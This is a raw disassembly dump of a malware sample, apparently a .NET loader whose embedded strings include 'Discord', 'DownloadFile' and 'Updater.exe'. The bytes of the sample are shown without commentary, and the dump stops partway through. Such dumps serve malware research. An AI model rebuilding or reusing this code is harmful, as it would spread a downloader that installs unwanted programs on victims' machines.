
malware_samples/loader/067908d088c05b576bfb91916cf06ab600cff82e02dacc62d025d34a4919afec.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	2c 2a                	sub    $0x2a,%al
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 2c 21 00    	add    %al,0x212c00
  402013:	00 34 08             	add    %dh,(%eax,%ecx,1)
  402016:	00 00                	add    %al,(%eax)
  402018:	01 00                	add    %eax,(%eax)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	02 00                	add    (%eax),%al
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	13 30                	adc    (%eax),%esi
  402052:	02 00                	add    (%eax),%al
  402054:	44                   	inc    %esp
  402055:	00 00                	add    %al,(%eax)
  402057:	00 00                	add    %al,(%eax)
  402059:	00 00                	add    %al,(%eax)
  40205b:	00 1f                	add    %bl,(%edi)
  40205d:	1c 28                	sbb    $0x28,%al
  40205f:	0f 00 00             	sldt   (%eax)
  402062:	0a 72 01             	or     0x1(%edx),%dh
  402065:	00 00                	add    %al,(%eax)
  402067:	70 28                	jo     0x402091
  402069:	10 00                	adc    %al,(%eax)
  40206b:	00 0a                	add    %cl,(%edx)
  40206d:	80 01 00             	addb   $0x0,(%ecx)
  402070:	00 04 72             	add    %al,(%edx,%esi,2)
  402073:	13 00                	adc    (%eax),%eax
  402075:	00 70 28             	add    %dh,0x28(%eax)
  402078:	11 00                	adc    %eax,(%eax)
  40207a:	00 0a                	add    %cl,(%edx)
  40207c:	72 2f                	jb     0x4020ad
  40207e:	00 00                	add    %al,(%eax)
  402080:	70 28                	jo     0x4020aa
  402082:	10 00                	adc    %al,(%eax)
  402084:	00 0a                	add    %cl,(%edx)
  402086:	80 02 00             	addb   $0x0,(%edx)
  402089:	00 04 7e             	add    %al,(%esi,%edi,2)
  40208c:	02 00                	add    (%eax),%al
  40208e:	00 04 72             	add    %al,(%edx,%esi,2)
  402091:	4b                   	dec    %ebx
  402092:	00 00                	add    %al,(%eax)
  402094:	70 28                	jo     0x4020be
  402096:	10 00                	adc    %al,(%eax)
  402098:	00 0a                	add    %cl,(%edx)
  40209a:	80 03 00             	addb   $0x0,(%ebx)
  40209d:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4020a0:	13 30                	adc    (%eax),%esi
  4020a2:	03 00                	add    (%eax),%eax
  4020a4:	75 00                	jne    0x4020a6
  4020a6:	00 00                	add    %al,(%eax)
  4020a8:	01 00                	add    %eax,(%eax)
  4020aa:	00 11                	add    %dl,(%ecx)
  4020ac:	00 7e 01             	add    %bh,0x1(%esi)
  4020af:	00 00                	add    %al,(%eax)
  4020b1:	04 28                	add    $0x28,%al
  4020b3:	12 00                	adc    (%eax),%al
  4020b5:	00 0a                	add    %cl,(%edx)
  4020b7:	16                   	push   %ss
  4020b8:	fe 01                	incb   (%ecx)
  4020ba:	0a 06                	or     (%esi),%al
  4020bc:	2c 07                	sub    $0x7,%al
  4020be:	16                   	push   %ss
  4020bf:	28 13                	sub    %dl,(%ebx)
  4020c1:	00 00                	add    %al,(%eax)
  4020c3:	0a 00                	or     (%eax),%al
  4020c5:	7e 03                	jle    0x4020ca
  4020c7:	00 00                	add    %al,(%eax)
  4020c9:	04 28                	add    $0x28,%al
  4020cb:	14 00                	adc    $0x0,%al
  4020cd:	00 0a                	add    %cl,(%edx)
  4020cf:	0b 07                	or     (%edi),%eax
  4020d1:	2c 0d                	sub    $0xd,%al
  4020d3:	7e 03                	jle    0x4020d8
  4020d5:	00 00                	add    %al,(%eax)
  4020d7:	04 28                	add    $0x28,%al
  4020d9:	15 00 00 0a 26       	adc    $0x260a0000,%eax
  4020de:	2b 40 00             	sub    0x0(%eax),%eax
  4020e1:	7e 02                	jle    0x4020e5
  4020e3:	00 00                	add    %al,(%eax)
  4020e5:	04 28                	add    $0x28,%al
  4020e7:	12 00                	adc    (%eax),%al
  4020e9:	00 0a                	add    %cl,(%edx)
  4020eb:	16                   	push   %ss
  4020ec:	fe 01                	incb   (%ecx)
  4020ee:	0d 09 2c 0b 7e       	or     $0x7e0b2c09,%eax
  4020f3:	02 00                	add    (%eax),%al
  4020f5:	00 04 28             	add    %al,(%eax,%ebp,1)
  4020f8:	16                   	push   %ss
  4020f9:	00 00                	add    %al,(%eax)
  4020fb:	0a 26                	or     (%esi),%ah
  4020fd:	73 17                	jae    0x402116
  4020ff:	00 00                	add    %al,(%eax)
  402101:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402104:	72 6f                	jb     0x402175
  402106:	00 00                	add    %al,(%eax)
  402108:	70 7e                	jo     0x402188
  40210a:	03 00                	add    (%eax),%eax
  40210c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40210f:	18 00                	sbb    %al,(%eax)
  402111:	00 0a                	add    %cl,(%edx)
  402113:	00 7e 03             	add    %bh,0x3(%esi)
  402116:	00 00                	add    %al,(%eax)
  402118:	04 28                	add    $0x28,%al
  40211a:	15 00 00 0a 26       	adc    $0x260a0000,%eax
  40211f:	00 2a                	add    %ch,(%edx)
  402121:	22 02                	and    (%edx),%al
  402123:	28 19                	sub    %bl,(%ecx)
  402125:	00 00                	add    %al,(%eax)
  402127:	0a 00                	or     (%eax),%al
  402129:	2a 00                	sub    (%eax),%al
  40212b:	00 42 53             	add    %al,0x53(%edx)
  40212e:	4a                   	dec    %edx
  40212f:	42                   	inc    %edx
  402130:	01 00                	add    %eax,(%eax)
  402132:	01 00                	add    %eax,(%eax)
  402134:	00 00                	add    %al,(%eax)
  402136:	00 00                	add    %al,(%eax)
  402138:	0c 00                	or     $0x0,%al
  40213a:	00 00                	add    %al,(%eax)
  40213c:	76 34                	jbe    0x402172
  40213e:	2e 30 2e             	xor    %ch,%cs:(%esi)
  402141:	33 30                	xor    (%eax),%esi
  402143:	33 31                	xor    (%ecx),%esi
  402145:	39 00                	cmp    %eax,(%eax)
  402147:	00 00                	add    %al,(%eax)
  402149:	00 05 00 6c 00 00    	add    %al,0x6c00
  40214f:	00 80 02 00 00 23    	add    %al,0x23000002(%eax)
  402155:	7e 00                	jle    0x402157
  402157:	00 ec                	add    %ch,%ah
  402159:	02 00                	add    (%eax),%al
  40215b:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40215e:	00 00                	add    %al,(%eax)
  402160:	23 53 74             	and    0x74(%ebx),%edx
  402163:	72 69                	jb     0x4021ce
  402165:	6e                   	outsb  %ds:(%esi),(%dx)
  402166:	67 73 00             	addr16 jae 0x402169
  402169:	00 00                	add    %al,(%eax)
  40216b:	00 08                	add    %cl,(%eax)
  40216d:	06                   	push   %es
  40216e:	00 00                	add    %al,(%eax)
  402170:	c0 00 00             	rolb   $0x0,(%eax)
  402173:	00 23                	add    %ah,(%ebx)
  402175:	55                   	push   %ebp
  402176:	53                   	push   %ebx
  402177:	00 c8                	add    %cl,%al
  402179:	06                   	push   %es
  40217a:	00 00                	add    %al,(%eax)
  40217c:	10 00                	adc    %al,(%eax)
  40217e:	00 00                	add    %al,(%eax)
  402180:	23 47 55             	and    0x55(%edi),%eax
  402183:	49                   	dec    %ecx
  402184:	44                   	inc    %esp
  402185:	00 00                	add    %al,(%eax)
  402187:	00 d8                	add    %bl,%al
  402189:	06                   	push   %es
  40218a:	00 00                	add    %al,(%eax)
  40218c:	5c                   	pop    %esp
  40218d:	01 00                	add    %eax,(%eax)
  40218f:	00 23                	add    %ah,(%ebx)
  402191:	42                   	inc    %edx
  402192:	6c                   	insb   (%dx),%es:(%edi)
  402193:	6f                   	outsl  %ds:(%esi),(%dx)
  402194:	62 00                	bound  %eax,(%eax)
  402196:	00 00                	add    %al,(%eax)
  402198:	00 00                	add    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	02 00                	add    (%eax),%al
  40219e:	00 01                	add    %al,(%ecx)
  4021a0:	57                   	push   %edi
  4021a1:	94                   	xchg   %eax,%esp
  4021a2:	02 00                	add    (%eax),%al
  4021a4:	09 00                	or     %eax,(%eax)
  4021a6:	00 00                	add    %al,(%eax)
  4021a8:	00 fa                	add    %bh,%dl
  4021aa:	01 33                	add    %esi,(%ebx)
  4021ac:	00 16                	add    %dl,(%esi)
  4021ae:	00 00                	add    %al,(%eax)
  4021b0:	01 00                	add    %eax,(%eax)
  4021b2:	00 00                	add    %al,(%eax)
  4021b4:	19 00                	sbb    %eax,(%eax)
  4021b6:	00 00                	add    %al,(%eax)
  4021b8:	03 00                	add    (%eax),%eax
  4021ba:	00 00                	add    %al,(%eax)
  4021bc:	03 00                	add    (%eax),%eax
  4021be:	00 00                	add    %al,(%eax)
  4021c0:	03 00                	add    (%eax),%eax
  4021c2:	00 00                	add    %al,(%eax)
  4021c4:	19 00                	sbb    %eax,(%eax)
  4021c6:	00 00                	add    %al,(%eax)
  4021c8:	0e                   	push   %cs
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	00 01                	add    %al,(%ecx)
  4021cd:	00 00                	add    %al,(%eax)
  4021cf:	00 01                	add    %al,(%ecx)
  4021d1:	00 00                	add    %al,(%eax)
  4021d3:	00 01                	add    %al,(%ecx)
  4021d5:	00 00                	add    %al,(%eax)
  4021d7:	00 02                	add    %al,(%edx)
  4021d9:	00 00                	add    %al,(%eax)
  4021db:	00 00                	add    %al,(%eax)
  4021dd:	00 ac 01 01 00 00 00 	add    %ch,0x1(%ecx,%eax,1)
  4021e4:	00 00                	add    %al,(%eax)
  4021e6:	06                   	push   %es
  4021e7:	00 21                	add    %ah,(%ecx)
  4021e9:	01 70 02             	add    %esi,0x2(%eax)
  4021ec:	06                   	push   %es
  4021ed:	00 8e 01 70 02 06    	add    %cl,0x6027001(%esi)
  4021f3:	00 55 00             	add    %dl,0x0(%ebp)
  4021f6:	3e 02 0f             	add    %ds:(%edi),%cl
  4021f9:	00 90 02 00 00 06    	add    %dl,0x6000002(%eax)
  4021ff:	00 7d 00             	add    %bh,0x0(%ebp)
  402202:	fb                   	sti
  402203:	01 06                	add    %eax,(%esi)
  402205:	00 04 01             	add    %al,(%ecx,%eax,1)
  402208:	fb                   	sti
  402209:	01 06                	add    %eax,(%esi)
  40220b:	00 e5                	add    %ah,%ch
  40220d:	00 fb                	add    %bh,%bl
  40220f:	01 06                	add    %eax,(%esi)
  402211:	00 75 01             	add    %dh,0x1(%ebp)
  402214:	fb                   	sti
  402215:	01 06                	add    %eax,(%esi)
  402217:	00 41 01             	add    %al,0x1(%ecx)
  40221a:	fb                   	sti
  40221b:	01 06                	add    %eax,(%esi)
  40221d:	00 5a 01             	add    %bl,0x1(%edx)
  402220:	fb                   	sti
  402221:	01 06                	add    %eax,(%esi)
  402223:	00 94 00 fb 01 06 00 	add    %dl,0x601fb(%eax,%eax,1)
  40222a:	69 00 51 02 06 00    	imul   $0x60251,(%eax),%eax
  402230:	47                   	inc    %edi
  402231:	00 51 02             	add    %dl,0x2(%ecx)
  402234:	06                   	push   %es
  402235:	00 c8                	add    %cl,%al
  402237:	00 fb                	add    %bh,%bl
  402239:	01 06                	add    %eax,(%esi)
  40223b:	00 af 00 b8 01 06    	add    %ch,0x601b800(%edi)
  402241:	00 3d 00 ef 01 06    	add    %bh,0x601ef00
  402247:	00 d6                	add    %dl,%dh
  402249:	02 ef                	add    %bh,%ch
  40224b:	01 0a                	add    %ecx,(%edx)
  40224d:	00 ed                	add    %ch,%ch
  40224f:	02 dd                	add    %ch,%bl
  402251:	02 06                	add    (%esi),%al
  402253:	00 f7                	add    %dh,%bh
  402255:	02 ef                	add    %bh,%ch
  402257:	01 4f 00             	add    %ecx,0x0(%edi)
  40225a:	1b 02                	sbb    (%edx),%eax
  40225c:	00 00                	add    %al,(%eax)
  40225e:	06                   	push   %es
  40225f:	00 d2                	add    %dl,%dl
  402261:	01 ef                	add    %ebp,%edi
  402263:	01 06                	add    %eax,(%esi)
  402265:	00 0f                	add    %cl,(%edi)
  402267:	03 0a                	add    (%edx),%ecx
  402269:	00 06                	add    %al,(%esi)
  40226b:	00 2d 00 0a 00 0a    	add    %ch,0xa000a00
  402271:	00 c0                	add    %al,%al
  402273:	02 3e                	add    (%esi),%bh
  402275:	02 06                	add    (%esi),%al
  402277:	00 0d 02 0a 00 00    	add    %cl,0xa02
  40227d:	00 00                	add    %al,(%eax)
  40227f:	00 01                	add    %al,(%ecx)
  402281:	00 00                	add    %al,(%eax)
  402283:	00 00                	add    %al,(%eax)
  402285:	00 01                	add    %al,(%ecx)
  402287:	00 01                	add    %al,(%ecx)
  402289:	00 08                	add    %cl,(%eax)
  40228b:	01 10                	add    %edx,(%eax)
  40228d:	00 ba 02 32 00 41    	add    %bh,0x41003202(%edx)
  402293:	00 01                	add    %al,(%ecx)
  402295:	00 01                	add    %al,(%ecx)
  402297:	00 00                	add    %al,(%eax)
  402299:	00 10                	add    %dl,(%eax)
  40229b:	00 e7                	add    %ah,%bh
  40229d:	01 32                	add    %esi,(%edx)
  40229f:	00 45 00             	add    %al,0x0(%ebp)
  4022a2:	04 00                	add    $0x0,%al
  4022a4:	02 00                	add    (%eax),%al
  4022a6:	16                   	push   %ss
  4022a7:	00 1d 00 58 00 16    	add    %bl,0x16005800
  4022ad:	00 e2                	add    %ah,%dl
  4022af:	01 58 00             	add    %ebx,0x0(%eax)
  4022b2:	16                   	push   %ss
  4022b3:	00 2d 00 58 00 50    	add    %ch,0x50005800
  4022b9:	20 00                	and    %al,(%eax)
  4022bb:	00 00                	add    %al,(%eax)
  4022bd:	00 91 18 37 02 5b    	add    %dl,0x5b023718(%ecx)
  4022c3:	00 01                	add    %al,(%ecx)
  4022c5:	00 a0 20 00 00 00    	add    %ah,0x20(%eax)
  4022cb:	00 91 00 f6 01 5b    	add    %dl,0x5b01f600(%ecx)
  4022d1:	00 01                	add    %al,(%ecx)
  4022d3:	00 21                	add    %ah,(%ecx)
  4022d5:	21 00                	and    %eax,(%eax)
  4022d7:	00 00                	add    %al,(%eax)
  4022d9:	00 86 18 31 02 06    	add    %al,0x6023118(%esi)
  4022df:	00 01                	add    %al,(%ecx)
  4022e1:	00 09                	add    %cl,(%ecx)
  4022e3:	00 31                	add    %dh,(%ecx)
  4022e5:	02 01                	add    (%ecx),%al
  4022e7:	00 11                	add    %dl,(%ecx)
  4022e9:	00 31                	add    %dh,(%ecx)
  4022eb:	02 06                	add    (%esi),%al
  4022ed:	00 19                	add    %bl,(%ecx)
  4022ef:	00 31                	add    %dh,(%ecx)
  4022f1:	02 0a                	add    (%edx),%cl
  4022f3:	00 29                	add    %ch,(%ecx)
  4022f5:	00 31                	add    %dh,(%ecx)
  4022f7:	02 10                	add    (%eax),%dl
  4022f9:	00 31                	add    %dh,(%ecx)
  4022fb:	00 31                	add    %dh,(%ecx)
  4022fd:	02 10                	add    (%eax),%dl
  4022ff:	00 39                	add    %bh,(%ecx)
  402301:	00 31                	add    %dh,(%ecx)
  402303:	02 10                	add    (%eax),%dl
  402305:	00 41 00             	add    %al,0x0(%ecx)
  402308:	31 02                	xor    %eax,(%edx)
  40230a:	10 00                	adc    %al,(%eax)
  40230c:	49                   	dec    %ecx
  40230d:	00 31                	add    %dh,(%ecx)
  40230f:	02 10                	add    (%eax),%dl
  402311:	00 51 00             	add    %dl,0x0(%ecx)
  402314:	31 02                	xor    %eax,(%edx)
  402316:	10 00                	adc    %al,(%eax)
  402318:	59                   	pop    %ecx
  402319:	00 31                	add    %dh,(%ecx)
  40231b:	02 10                	add    (%eax),%dl
  40231d:	00 61 00             	add    %ah,0x0(%ecx)
  402320:	31 02                	xor    %eax,(%edx)
  402322:	15 00 69 00 31       	adc    $0x31006900,%eax
  402327:	02 10                	add    (%eax),%dl
  402329:	00 71 00             	add    %dh,0x0(%ecx)
  40232c:	31 02                	xor    %eax,(%edx)
  40232e:	10 00                	adc    %al,(%eax)
  402330:	79 00                	jns    0x402332
  402332:	31 02                	xor    %eax,(%edx)
  402334:	10 00                	adc    %al,(%eax)
  402336:	99                   	cltd
  402337:	00 d9                	add    %bl,%cl
  402339:	01 1a                	add    %ebx,(%edx)
  40233b:	00 a9 00 cf 02 20    	add    %ch,0x2002cf00(%ecx)
  402341:	00 99 00 9f 02 26    	add    %bl,0x26029f00(%ecx)
  402347:	00 b1 00 c8 02 33    	add    %dh,0x3302c800(%ecx)
  40234d:	00 99 00 e8 02 38    	add    %bl,0x3802e800(%ecx)
  402353:	00 b9 00 c8 02 33    	add    %bh,0x3302c800(%ecx)
  402359:	00 c1                	add    %al,%cl
  40235b:	00 03                	add    %al,(%ebx)
  40235d:	03 3d 00 b1 00 09    	add    0x900b100,%edi
  402363:	03 43 00             	add    0x0(%ebx),%eax
  402366:	91                   	xchg   %eax,%ecx
  402367:	00 31                	add    %dh,(%ecx)
  402369:	02 06                	add    (%esi),%al
  40236b:	00 91 00 25 00 49    	add    %dl,0x49002500(%ecx)
  402371:	00 89 00 31 02 06    	add    %cl,0x6023100(%ecx)
  402377:	00 2e                	add    %ch,(%esi)
  402379:	00 0b                	add    %cl,(%ebx)
  40237b:	00 5f 00             	add    %bl,0x0(%edi)
  40237e:	2e 00 13             	add    %dl,%cs:(%ebx)
  402381:	00 68 00             	add    %ch,0x0(%eax)
  402384:	2e 00 1b             	add    %bl,%cs:(%ebx)
  402387:	00 87 00 2e 00 23    	add    %al,0x23002e00(%edi)
  40238d:	00 90 00 2e 00 2b    	add    %dl,0x2b002e00(%eax)
  402393:	00 a0 00 2e 00 33    	add    %ah,0x33002e00(%eax)
  402399:	00 a0 00 2e 00 3b    	add    %ah,0x3b002e00(%eax)
  40239f:	00 a6 00 2e 00 43    	add    %ah,0x43002e00(%esi)
  4023a5:	00 90 00 2e 00 4b    	add    %dl,0x4b002e00(%eax)
  4023ab:	00 b6 00 2e 00 53    	add    %dh,0x53002e00(%esi)
  4023b1:	00 a0 00 2e 00 5b    	add    %ah,0x5b002e00(%eax)
  4023b7:	00 a0 00 2e 00 63    	add    %ah,0x63002e00(%eax)
  4023bd:	00 d8                	add    %bl,%al
  4023bf:	00 2e                	add    %ch,(%esi)
  4023c1:	00 6b 00             	add    %ch,0x0(%ebx)
  4023c4:	02 01                	add    (%ecx),%al
  4023c6:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  4023ca:	0f 01 00             	sgdtl  (%eax)
  4023cd:	00 01                	add    %al,(%ecx)
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	00 02                	add    %al,(%edx)
  4023d3:	00 2b                	add    %ch,(%ebx)
  4023d5:	00 04 80             	add    %al,(%eax,%eax,4)
  4023d8:	00 00                	add    %al,(%eax)
  4023da:	01 00                	add    %eax,(%eax)
	...
  4023e8:	29 02                	sub    %eax,(%edx)
  4023ea:	00 00                	add    %al,(%eax)
  4023ec:	04 00                	add    $0x0,%al
	...
  4023f6:	00 00                	add    %al,(%eax)
  4023f8:	4f                   	dec    %edi
  4023f9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	00 00                	add    %al,(%eax)
  402400:	04 00                	add    $0x0,%al
	...
  40240a:	00 00                	add    %al,(%eax)
  40240c:	4f                   	dec    %edi
  40240d:	00 ef                	add    %ch,%bh
  40240f:	01 00                	add    %eax,(%eax)
	...
  402419:	3c 4d                	cmp    $0x4d,%al
  40241b:	6f                   	outsl  %ds:(%esi),(%dx)
  40241c:	64 75 6c             	fs jne 0x40248b
  40241f:	65 3e 00 53 79       	gs add %dl,%ds:0x79(%ebx)
  402424:	73 74                	jae    0x40249a
  402426:	65 6d                	gs insl (%dx),%es:(%edi)
  402428:	2e 49                	cs dec %ecx
  40242a:	4f                   	dec    %edi
  40242b:	00 6d 73             	add    %ch,0x73(%ebp)
  40242e:	63 6f 72             	arpl   %ebp,0x72(%edi)
  402431:	6c                   	insb   (%dx),%es:(%edi)
  402432:	69 62 00 44 69 73 63 	imul   $0x63736944,0x0(%edx),%esp
  402439:	6f                   	outsl  %ds:(%esi),(%dx)
  40243a:	72 64                	jb     0x4024a0
  40243c:	00 44 6f 77          	add    %al,0x77(%edi,%ebp,2)
  402440:	6e                   	outsb  %ds:(%esi),(%dx)
  402441:	6c                   	insb   (%dx),%es:(%edi)
  402442:	6f                   	outsl  %ds:(%esi),(%dx)
  402443:	61                   	popa
  402444:	64 46                	fs inc %esi
  402446:	69 6c 65 00 42 6f 72 	imul   $0x64726f42,0x0(%ebp,%eiz,2),%ebp
  40244d:	64 
  40244e:	65 72 4c             	gs jb  0x40249d
  402451:	69 6e 65 00 56 61 6c 	imul   $0x6c615600,0x65(%esi),%ebp
  402458:	75 65                	jne    0x4024bf
  40245a:	54                   	push   %esp
  40245b:	79 70                	jns    0x4024cd
  40245d:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  402461:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  402468:	62 
  402469:	75 74                	jne    0x4024df
  40246b:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  402470:	75 67                	jne    0x4024d9
  402472:	67 61                	addr16 popa
  402474:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  402478:	74 74                	je     0x4024ee
  40247a:	72 69                	jb     0x4024e5
  40247c:	62 75 74             	bound  %esi,0x74(%ebp)
  40247f:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  402483:	6d                   	insl   (%dx),%es:(%edi)
  402484:	56                   	push   %esi
  402485:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  40248c:	74 74                	je     0x402502
  40248e:	72 69                	jb     0x4024f9
  402490:	62 75 74             	bound  %esi,0x74(%ebp)
  402493:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402497:	73 65                	jae    0x4024fe
  402499:	6d                   	insl   (%dx),%es:(%edi)
  40249a:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40249e:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  4024a5:	72 
  4024a6:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  4024ad:	73 73                	jae    0x402522
  4024af:	65 6d                	gs insl (%dx),%es:(%edi)
  4024b1:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4024b5:	72 61                	jb     0x402518
  4024b7:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  4024ba:	61                   	popa
  4024bb:	72 6b                	jb     0x402528
  4024bd:	41                   	inc    %ecx
  4024be:	74 74                	je     0x402534
  4024c0:	72 69                	jb     0x40252b
  4024c2:	62 75 74             	bound  %esi,0x74(%ebp)
  4024c5:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  4024ca:	67 65 74 46          	addr16 gs je 0x402514
  4024ce:	72 61                	jb     0x402531
  4024d0:	6d                   	insl   (%dx),%es:(%edi)
  4024d1:	65 77 6f             	gs ja  0x402543
  4024d4:	72 6b                	jb     0x402541
  4024d6:	41                   	inc    %ecx
  4024d7:	74 74                	je     0x40254d
  4024d9:	72 69                	jb     0x402544
  4024db:	62 75 74             	bound  %esi,0x74(%ebp)
  4024de:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4024e2:	73 65                	jae    0x402549
  4024e4:	6d                   	insl   (%dx),%es:(%edi)
  4024e5:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4024e9:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4024f0:	69 
  4024f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4024f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4024f3:	41                   	inc    %ecx
  4024f4:	74 74                	je     0x40256a
  4024f6:	72 69                	jb     0x402561
  4024f8:	62 75 74             	bound  %esi,0x74(%ebp)
  4024fb:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4024ff:	73 65                	jae    0x402566
  402501:	6d                   	insl   (%dx),%es:(%edi)
  402502:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402506:	6f                   	outsl  %ds:(%esi),(%dx)
  402507:	6e                   	outsb  %ds:(%esi),(%dx)
  402508:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  40250e:	74 69                	je     0x402579
  402510:	6f                   	outsl  %ds:(%esi),(%dx)
  402511:	6e                   	outsb  %ds:(%esi),(%dx)
  402512:	41                   	inc    %ecx
  402513:	74 74                	je     0x402589
  402515:	72 69                	jb     0x402580
  402517:	62 75 74             	bound  %esi,0x74(%ebp)
  40251a:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40251e:	73 65                	jae    0x402585
  402520:	6d                   	insl   (%dx),%es:(%edi)
  402521:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  402525:	65 73 63             	gs jae 0x40258b
  402528:	72 69                	jb     0x402593
  40252a:	70 74                	jo     0x4025a0
  40252c:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  402533:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  40253a:	6f                   	outsl  %ds:(%esi),(%dx)
  40253b:	6d                   	insl   (%dx),%es:(%edi)
  40253c:	70 69                	jo     0x4025a7
  40253e:	6c                   	insb   (%dx),%es:(%edi)
  40253f:	61                   	popa
  402540:	74 69                	je     0x4025ab
  402542:	6f                   	outsl  %ds:(%esi),(%dx)
  402543:	6e                   	outsb  %ds:(%esi),(%dx)
  402544:	52                   	push   %edx
  402545:	65 6c                	gs insb (%dx),%es:(%edi)
  402547:	61                   	popa
  402548:	78 61                	js     0x4025ab
  40254a:	74 69                	je     0x4025b5
  40254c:	6f                   	outsl  %ds:(%esi),(%dx)
  40254d:	6e                   	outsb  %ds:(%esi),(%dx)
  40254e:	73 41                	jae    0x402591
  402550:	74 74                	je     0x4025c6
  402552:	72 69                	jb     0x4025bd
  402554:	62 75 74             	bound  %esi,0x74(%ebp)
  402557:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40255b:	73 65                	jae    0x4025c2
  40255d:	6d                   	insl   (%dx),%es:(%edi)
  40255e:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  402562:	72 6f                	jb     0x4025d3
  402564:	64 75 63             	fs jne 0x4025ca
  402567:	74 41                	je     0x4025aa
  402569:	74 74                	je     0x4025df
  40256b:	72 69                	jb     0x4025d6
  40256d:	62 75 74             	bound  %esi,0x74(%ebp)
  402570:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402574:	73 65                	jae    0x4025db
  402576:	6d                   	insl   (%dx),%es:(%edi)
  402577:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40257b:	6f                   	outsl  %ds:(%esi),(%dx)
  40257c:	70 79                	jo     0x4025f7
  40257e:	72 69                	jb     0x4025e9
  402580:	67 68 74 41 74 74    	addr16 push $0x74744174
  402586:	72 69                	jb     0x4025f1
  402588:	62 75 74             	bound  %esi,0x74(%ebp)
  40258b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40258f:	73 65                	jae    0x4025f6
  402591:	6d                   	insl   (%dx),%es:(%edi)
  402592:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402596:	6f                   	outsl  %ds:(%esi),(%dx)
  402597:	6d                   	insl   (%dx),%es:(%edi)
  402598:	70 61                	jo     0x4025fb
  40259a:	6e                   	outsb  %ds:(%esi),(%dx)
  40259b:	79 41                	jns    0x4025de
  40259d:	74 74                	je     0x402613
  40259f:	72 69                	jb     0x40260a
  4025a1:	62 75 74             	bound  %esi,0x74(%ebp)
  4025a4:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4025a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4025a9:	74 69                	je     0x402614
  4025ab:	6d                   	insl   (%dx),%es:(%edi)
  4025ac:	65 43                	gs inc %ebx
  4025ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4025af:	6d                   	insl   (%dx),%es:(%edi)
  4025b0:	70 61                	jo     0x402613
  4025b2:	74 69                	je     0x40261d
  4025b4:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  4025b7:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4025be:	69 
  4025bf:	62 75 74             	bound  %esi,0x74(%ebp)
  4025c2:	65 00 55 70          	add    %dl,%gs:0x70(%ebp)
  4025c6:	64 61                	fs popa
  4025c8:	74 65                	je     0x40262f
  4025ca:	72 2e                	jb     0x4025fa
  4025cc:	65 78 65             	gs js  0x402634
  4025cf:	00 53 79             	add    %dl,0x79(%ebx)
  4025d2:	73 74                	jae    0x402648
  4025d4:	65 6d                	gs insl (%dx),%es:(%edi)
  4025d6:	2e 52                	cs push %edx
  4025d8:	75 6e                	jne    0x402648
  4025da:	74 69                	je     0x402645
  4025dc:	6d                   	insl   (%dx),%es:(%edi)
  4025dd:	65 2e 56             	gs cs push %esi
  4025e0:	65 72 73             	gs jb  0x402656
  4025e3:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  4025ea:	53                   	push   %ebx
  4025eb:	74 72                	je     0x40265f
  4025ed:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4025f4:	46                   	inc    %esi
  4025f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4025f6:	6c                   	insb   (%dx),%es:(%edi)
  4025f7:	64 65 72 50          	fs gs jb 0x40264b
  4025fb:	61                   	popa
  4025fc:	74 68                	je     0x402666
  4025fe:	00 50 72             	add    %dl,0x72(%eax)
